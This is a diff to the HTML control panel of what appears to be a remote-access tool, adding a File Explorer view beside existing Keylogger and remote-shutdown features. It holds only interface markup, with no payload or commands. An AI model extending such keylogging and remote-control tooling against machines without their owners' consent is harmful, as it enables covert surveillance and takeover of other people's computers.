@@ -55,6 +55,9 @@
                         <li class="nav-item" data-view="keylogger">
                             <i data-feather="activity"></i> <span>Keylogger</span>
                         </li>
+                        <li class="nav-item" data-view="files">
+                            <i data-feather="folder"></i> <span>File Explorer</span>
+                        </li>
                     </ul>
                 </div>
 
@@ -283,6 +286,53 @@
                             <div class="card-icon red"><i data-feather="power"></i></div>
                             <h3>Shutdown System</h3>
                             <p>Power off the remote machine immediately</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="content-view" id="view-files">
+                    <div class="content-header">
+                        <div>
+                            <h1>File Explorer</h1>
+                            <p class="subtitle">Manage filesystem</p>
+                        </div>
+                    </div>
+                    
+                    <div class="content-toolbar">
+                        <div class="file-toolbar-group">
+                            <button class="btn btn-round-refresh" id="btn-fs-refresh" title="Refresh">
+                                <i data-feather="refresh-cw"></i>
+                            </button>
+                            <button class="btn btn-outline" id="btn-fs-up" title="Up One Level">
+                                <i data-feather="corner-left-up"></i>
+                            </button>
+                        </div>
+
+                        <div class="input-wrapper file-address-bar">
+                            <i data-feather="hard-drive"></i>
+                            <input type="text" id="fs-path-input" placeholder="Path..." class="path-input">
+                            <button class="btn btn-sm btn-glass" id="btn-fs-go">Go</button>
+                        </div>
+
+                        <div class="file-toolbar-group">
+                            <button class="btn btn-outline" id="btn-fs-new-folder" title="New Folder">
+                                <i data-feather="folder-plus"></i>
+                            </button>
+                            <button class="btn btn-outline" id="btn-fs-new-file" title="New File">
+                                <i data-feather="file-plus"></i>
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="fs-container">
+                        <div class="fs-sidebar">
+                            <div class="fs-tree-root" id="fs-tree-container">
+                                <div class="list-loading">Select a drive...</div>
+                            </div>
+                        </div>
+                        <div class="fs-main">
+                            <div id="file-grid" class="file-grid">
+                                </div>
                         </div>
                     </div>
                 </div>
